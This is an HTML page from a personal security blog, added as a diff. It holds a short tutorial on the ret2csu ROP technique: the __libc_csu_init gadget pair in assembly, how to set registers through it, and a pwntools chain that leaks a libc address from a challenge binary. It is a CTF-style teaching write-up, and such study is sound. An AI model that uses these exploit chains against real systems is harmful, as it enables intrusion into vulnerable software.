@@ -1,0 +1,188 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#060606" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#f3f3f3" media="(prefers-color-scheme: light)">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>ret2csu — the universal gadget hiding in every binary — algoatson.github.io</title>
+<meta name="description" content="No &quot;pop rsi; pop rdx&quot; in your gadget set? The compiler left one behind for you. __libc_csu_init contains a register-loading sequence and an indirect call that together set rdi, rsi and rdx and call anything — the gadget you reach for when the binary is too small to have its own.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/ret2csu-universal-gadget/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2csu — the universal gadget hiding in every binary — algoatson.github.io">
+<meta property="og:description" content="No &quot;pop rsi; pop rdx&quot; in your gadget set? The compiler left one behind for you. __libc_csu_init contains a register-loading sequence and an indirect call that together set rdi, rsi and rdx and call anything — the gadget you reach for when the binary is too small to have its own.">
+<meta property="og:url" content="https://algoatson.github.io/p/ret2csu-universal-gadget/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/ret2csu-universal-gadget.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="preload" href="/assets/vga.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "ret2csu — the universal gadget hiding in every binary", "datePublished": "2026-01-15", "dateModified": "2026-01-15", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "No \"pop rsi; pop rdx\" in your gadget set? The compiler left one behind for you. __libc_csu_init contains a register-loading sequence and an indirect call that together set rdi, rsi and rdx and call anything — the gadget you reach for when the binary is too small to have its own.", "url": "https://algoatson.github.io/p/ret2csu-universal-gadget/", "mainEntityOfPage": "https://algoatson.github.io/p/ret2csu-universal-gadget/", "keywords": "pwn, rop"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/series/">series</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>ret2csu — the universal gadget hiding in every binary</h1>
+  <div class="meta"><span>2026-01-15</span><span>3 min read</span><a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/rop/">rop</a></div>
+</header>
+
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#the-two-halves">the two halves</a></li>
+<li><a href="#driving-it">driving it</a></li>
+<li><a href="#the-two-catches">the two catches</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p>The annoying gap in many 64-bit ROP problems: you have <code class="highlight">pop rdi</code>, but no
+<code class="highlight">pop rsi</code> and no <code class="highlight">pop rdx</code>, so you can't set up a three-argument call like
+<code class="highlight">write(1, buf, n)</code> or <code class="highlight">execve(path, argv, envp)</code>. Before you go hunting for
+<a href="/p/ret2dlresolve-no-leak/">ret2dlresolve</a> or a <a href="/p/stack-pivoting/">pivot</a>,
+check <code class="highlight">__libc_csu_init</code> — the C runtime startup function the linker bundles into
+nearly every dynamically-linked binary contains a near-universal argument-setting
+gadget.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./svc</span></figcaption><div class="target__grid target__grid--solo"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>linkage</dt><dd>dynamic, has __libc_csu_init</dd></div><div><dt>gap</dt><dd>pop rdi exists; pop rsi / pop rdx do not</dd></div></dl></div></figure>
+<h2 id="the-two-halves">the two halves<a class="headerlink" href="#the-two-halves" title="Permanent link">#</a></h2>
+<p>The tail of <code class="highlight">__libc_csu_init</code> disassembles into a <em>pop</em> block and a <em>mov/call</em>
+block, back to back:</p>
+<figure class="codeblock"><figcaption><span class="fname">__libc_csu_init (the gadget pair)</span><span class="lang">asm</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#-libc-csu-init-the-gadget-pair-1"> 1</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-2"> 2</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-3"> 3</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-4"> 4</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-5"> 5</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-6"> 6</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-7"> 7</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-8"> 8</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-9"> 9</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-10">10</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-11">11</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-12">12</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-13">13</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-14">14</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-15">15</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-16">16</a></span>
+<span class="normal"><a href="#-libc-csu-init-the-gadget-pair-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="-libc-csu-init-the-gadget-pair-1"><span class="c1">; --- gadget 2: load args from r13..r15, call [r12+rbx*8] ---</span>
+</span><span id="-libc-csu-init-the-gadget-pair-2"><span class="hll"><span class="nl">loop:</span><span class="w">  </span><span class="nf">mov</span><span class="w">  </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">r13</span>
+</span></span><span id="-libc-csu-init-the-gadget-pair-3"><span class="hll"><span class="w">       </span><span class="nf">mov</span><span class="w">  </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">r14</span>
+</span></span><span id="-libc-csu-init-the-gadget-pair-4"><span class="hll"><span class="w">       </span><span class="nf">mov</span><span class="w">  </span><span class="no">edi</span><span class="p">,</span><span class="w"> </span><span class="no">r15d</span><span class="w">            </span><span class="c1">; NOTE: 32-bit — first arg is truncated</span>
+</span></span><span id="-libc-csu-init-the-gadget-pair-5"><span class="hll"><span class="w">       </span><span class="nf">call</span><span class="w"> </span><span class="no">qword</span><span class="w"> </span><span class="p">[</span><span class="no">r12</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="no">rbx</span><span class="p">*</span><span class="mi">8</span><span class="p">]</span>
+</span></span><span id="-libc-csu-init-the-gadget-pair-6"><span class="w">       </span><span class="nf">add</span><span class="w">  </span><span class="no">rbx</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span>
+</span><span id="-libc-csu-init-the-gadget-pair-7"><span class="w">       </span><span class="nf">cmp</span><span class="w">  </span><span class="no">rbx</span><span class="p">,</span><span class="w"> </span><span class="no">rbp</span>
+</span><span id="-libc-csu-init-the-gadget-pair-8"><span class="w">       </span><span class="nf">jne</span><span class="w">  </span><span class="no">loop</span>
+</span><span id="-libc-csu-init-the-gadget-pair-9"><span class="w">       </span><span class="c1">; ... falls through to ...</span>
+</span><span id="-libc-csu-init-the-gadget-pair-10"><span class="c1">; --- gadget 1: fill rbx, rbp, r12, r13, r14, r15 ---</span>
+</span><span id="-libc-csu-init-the-gadget-pair-11"><span class="w">       </span><span class="nf">pop</span><span class="w">  </span><span class="no">rbx</span>
+</span><span id="-libc-csu-init-the-gadget-pair-12"><span class="w">       </span><span class="nf">pop</span><span class="w">  </span><span class="no">rbp</span>
+</span><span id="-libc-csu-init-the-gadget-pair-13"><span class="w">       </span><span class="nf">pop</span><span class="w">  </span><span class="no">r12</span>
+</span><span id="-libc-csu-init-the-gadget-pair-14"><span class="w">       </span><span class="nf">pop</span><span class="w">  </span><span class="no">r13</span>
+</span><span id="-libc-csu-init-the-gadget-pair-15"><span class="w">       </span><span class="nf">pop</span><span class="w">  </span><span class="no">r14</span>
+</span><span id="-libc-csu-init-the-gadget-pair-16"><span class="w">       </span><span class="nf">pop</span><span class="w">  </span><span class="no">r15</span>
+</span><span id="-libc-csu-init-the-gadget-pair-17"><span class="w">       </span><span class="nf">ret</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>Chain them: gadget 1 loads the registers, gadget 2 spreads them into the
+argument registers and calls through <code class="highlight">[r12+rbx*8]</code>.</p>
+<h2 id="driving-it">driving it<a class="headerlink" href="#driving-it" title="Permanent link">#</a></h2>
+<p>To call <code class="highlight">func(arg1, arg2, arg3)</code>:</p>
+<ul>
+<li><code class="highlight">rbx = 0</code>, <code class="highlight">rbp = 1</code> — so after the call <code class="highlight">add rbx,1; cmp rbx,rbp</code> is equal and
+  <code class="highlight">jne</code> falls straight through (no second iteration);</li>
+<li><code class="highlight">r12 = &amp;ptr</code> where <code class="highlight">*ptr == func</code> — the call is <em>indirect</em>, through memory, so
+  point <code class="highlight">r12</code> at a slot holding the target (a GOT entry works);</li>
+<li><code class="highlight">r13 = arg3</code> (→ rdx), <code class="highlight">r14 = arg2</code> (→ rsi), <code class="highlight">r15 = arg1</code> (→ edi).</li>
+</ul>
+<p>After the call, execution hits the six <code class="highlight">pop</code>s again, so pad the stack with six
+dummies before your next gadget.</p>
+<figure class="codeblock"><figcaption><span class="fname">ret2csu.py — leak libc via write(1, got, 8)</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#ret2csupy-leak-libc-via-write1-got-8-1">1</a></span>
+<span class="normal"><a href="#ret2csupy-leak-libc-via-write1-got-8-2">2</a></span>
+<span class="normal"><a href="#ret2csupy-leak-libc-via-write1-got-8-3">3</a></span>
+<span class="normal"><a href="#ret2csupy-leak-libc-via-write1-got-8-4">4</a></span>
+<span class="normal"><a href="#ret2csupy-leak-libc-via-write1-got-8-5">5</a></span>
+<span class="normal"><a href="#ret2csupy-leak-libc-via-write1-got-8-6">6</a></span>
+<span class="normal"><a href="#ret2csupy-leak-libc-via-write1-got-8-7">7</a></span>
+<span class="normal"><a href="#ret2csupy-leak-libc-via-write1-got-8-8">8</a></span>
+<span class="normal"><a href="#ret2csupy-leak-libc-via-write1-got-8-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="ret2csupy-leak-libc-via-write1-got-8-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="ret2csupy-leak-libc-via-write1-got-8-2"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./svc&quot;</span><span class="p">)</span>
+</span><span id="ret2csupy-leak-libc-via-write1-got-8-3"><span class="n">csu1</span> <span class="o">=</span> <span class="mh">0x4005ba</span>   <span class="c1"># pop rbx;rbp;r12;r13;r14;r15;ret</span>
+</span><span id="ret2csupy-leak-libc-via-write1-got-8-4"><span class="n">csu2</span> <span class="o">=</span> <span class="mh">0x4005a0</span>   <span class="c1"># mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]</span>
+</span><span id="ret2csupy-leak-libc-via-write1-got-8-5">
+</span><span id="ret2csupy-leak-libc-via-write1-got-8-6"><span class="hll"><span class="n">chain</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">])</span>   <span class="c1"># rbx,rbp,r12</span>
+</span></span><span id="ret2csupy-leak-libc-via-write1-got-8-7"><span class="hll"><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                <span class="c1"># r13=rdx,r14=rsi,r15=edi</span>
+</span></span><span id="ret2csupy-leak-libc-via-write1-got-8-8"><span class="hll"><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu2</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">8</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;main&quot;</span><span class="p">])</span>           <span class="c1"># call, 6 pads, back to main</span>
+</span></span><span id="ret2csupy-leak-libc-via-write1-got-8-9"><span class="c1"># pwntools will also synthesize this automatically: rop.call(&#39;write&#39;,[1,got,8])</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<details class="spoiler">
+<summary>args set, libc leaked, no pop rsi in sight</summary>
+<p><code class="highlight">write(1, puts@got, 8)</code> dumps a libc pointer; rebase, and the second stage is a
+one_gadget or <code class="highlight">system</code>:
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">segfault{the_runtime_left_me_a_gadget}
+</span></code></pre></div></td></tr></table></div>
+</figure></p>
+</details>
+<h2 id="the-two-catches">the two catches<a class="headerlink" href="#the-two-catches" title="Permanent link">#</a></h2>
+<ul>
+<li><strong><code class="highlight">mov edi, r15d</code> is 32-bit.</strong> The first argument is truncated to 32 bits — fine
+  for an <code class="highlight">fd</code> like <code class="highlight">1</code>, useless for a 64-bit pointer. So ret2csu is perfect for
+  <code class="highlight">write(1, …, …)</code> leaks; for a call needing a pointer in <code class="highlight">rdi</code> (like
+  <code class="highlight">execve(&quot;/bin/sh&quot;, …)</code>), pair it with a real <code class="highlight">pop rdi</code> for the first arg and let
+  csu handle <code class="highlight">rsi</code>/<code class="highlight">rdx</code>.</li>
+<li><strong>Modern binaries may not have it.</strong> Around glibc 2.34 the startup was
+  reorganised and <code class="highlight">__libc_csu_init</code> disappeared from new builds. On those, fall back
+  to other universal gadgets (<code class="highlight">__libc_start_main</code> fragments) or ret2dlresolve.</li>
+</ul>
+<p>ret2csu is the reminder that a binary's gadget set is bigger than its own code —
+the runtime glue the linker staples on carries a three-argument call primitive,
+sitting there in nearly every dynamically-linked ELF, waiting for the day you
+can't find a <code class="highlight">pop rdx</code>.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><div class="row"><span class="row__date">2026-05-30</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/stack-pivoting/">stack pivoting — when the overflow is too small</a><span class="row__min">3 min</span></div><div class="row"><span class="row__date">2026-05-22</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/srop-one-syscall-every-register/">SROP — one syscall, every register</a><span class="row__min">3 min</span></div><div class="row"><span class="row__date">2026-05-12</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/finding-gadgets/">finding gadgets: ROPgadget, ropper, one_gadget, pwntools</a><span class="row__min">5 min</span></div></div></section>
+<nav class="pager"><a class="prev" href="/p/tcache-poisoning-explained/"><span class="lbl">&#8249; newer</span>tcache poisoning, explained like you&#x27;ll have to use it</a><a class="next" href="/p/this-site-is-a-folder-of-text-files/"><span class="lbl">older &#8250;</span>this site is a folder of text files</a></nav></main>
+
+    <footer class="status">
+      <span>48 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h2>keys</h2><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
